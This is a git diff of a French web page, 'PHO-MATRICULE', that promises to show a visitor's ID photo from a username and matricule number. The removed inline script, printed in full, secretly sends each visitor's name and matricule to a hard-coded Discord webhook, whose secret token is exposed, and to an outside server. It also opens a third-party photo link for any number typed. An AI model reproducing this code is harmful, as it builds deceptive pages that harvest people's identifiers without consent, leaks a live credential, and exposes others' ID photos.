@@ -1,83 +1,21 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>PHO-MATRICULE</title>
-<style>
-body { font-family: Arial; display:flex; justify-content:center; align-items:center; height:100vh; background:url('mol.jpg') no-repeat center/cover; }
-.box { padding:30px; border-radius:12px; width:330px; text-align:center; background-color: rgb(67,65,170); box-shadow:0 0 10px rgba(0,0,0,0.2); }
-.box h2 { color: rgb(81,107,255); padding:15px; }
-input, textarea { width:90%; padding:10px; border-radius:8px; border:1px solid #ccc; margin-bottom:15px; }
-textarea { height:12px; resize:none; }
-button { width:100%; padding:12px; background:#5865f2; color:white; border:none; border-radius:8px; cursor:pointer; font-size:16px; }
-button:hover { background:#4752c4; }
-#status { margin-top:10px; font-weight:bold; }
-#info { margin-top:15px; color:white; font-size:14px; opacity:0.8; }
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PHO-MATRICULE</title>
+    <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-<div class="box">
-<h2>PHO-MATRI</h2>
-<input id="username" placeholder="Nom d'utilisateur..." />
-<textarea id="message" placeholder="Écris ton matricule ici..."></textarea>
-<button onclick="sendMessage();ouvrirPage();">VOIR PHOTO</button>
-<p id="info">Si vous ne voyez pas de photo, alors la vôtre n'est pas encore disponible.</p>
-<p id="status"></p>
-</div>
+    <div class="box">
+        <h2>PHO-MATRI</h2>
+        <input id="username" placeholder="Nom d'utilisateur..." />
+        <textarea id="message" placeholder="Écris ton matricule ici..."></textarea>
+        <button onclick="sendMessage();ouvrirPage();">VOIR PHOTO</button>
+        <p id="info">Si vous ne voyez pas de photo, alors la vôtre n'est pas encore disponible.</p>
+        <p id="status"></p>
+    </div>
 
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1375850659475357764/t6bGQnwd60BEYiNp2YCPQrxOSjQbsw_f4Mf3r5JSX43vyZWMhOdehlKzQ6M2keJcYUqo";
-const SERVER_URL = "https://matricules-server8.onrender.com/add"; // Remplace TON-IP par l'IP de ton appareil
-
-function isValidMatricule(mat) { return /^[0-9]{8}[A-Za-z]$/.test(mat); }
-
-function ouvrirPage() {
-  const mat = document.getElementById("message").value.trim();
-  if(!mat){ alert("Veuillez entrer un matricule !"); return; }
-  if(!isValidMatricule(mat)){ alert("❌ Format incorrect ! Exemple : 10123321L"); return; }
-  window.open("https://agfne.sigfne.net/vas/picture-prod/" + mat, "_blank");
-}
-
-function sendMessage() {
-  const message = document.getElementById("message").value.trim();
-  const username = document.getElementById("username").value.trim();
-  const status = document.getElementById("status");
-
-  if(!message){ status.innerHTML="⚠️ Le matricule est vide."; status.style.color="red"; return; }
-  if(!isValidMatricule(message)){ status.innerHTML="❌ Format incorrect ! Exemple : 19472803L"; status.style.color="red"; return; }
-  if(!username){ status.innerHTML="⚠️ Le nom d'utilisateur est vide."; status.style.color="red"; return; }
-
-  // Envoi au webhook Discord
-  fetch(WEBHOOK_URL, {
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body: JSON.stringify({ content:`👤 **Utilisateur :** ${username}\n🔢 **Matricule :** ${message}` })
-  });
-
-  // Envoi au serveur pour enregistrer sur ton appareil
-  fetch(SERVER_URL, {
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body: JSON.stringify({ matricule: message })
-  })
-  .then(res => res.json())
-  .then(data => {
-    if(data.status === "ok"){
-      status.innerHTML = "✔️ Matricule enregistré sur votre appareil !";
-      status.style.color = "lightgreen";
-      document.getElementById("message").value="";
-      document.getElementById("username").value="";
-    } else {
-      status.innerHTML = "❌ Erreur lors de l'enregistrement sur votre appareil.";
-      status.style.color = "red";
-    }
-  })
-  .catch(() => {
-    status.innerHTML = "❌ Impossible de contacter votre appareil.";
-    status.style.color = "red";
-  });
-}
-</script>
+    <script src="script.js"></script>
 </body>
 </html>
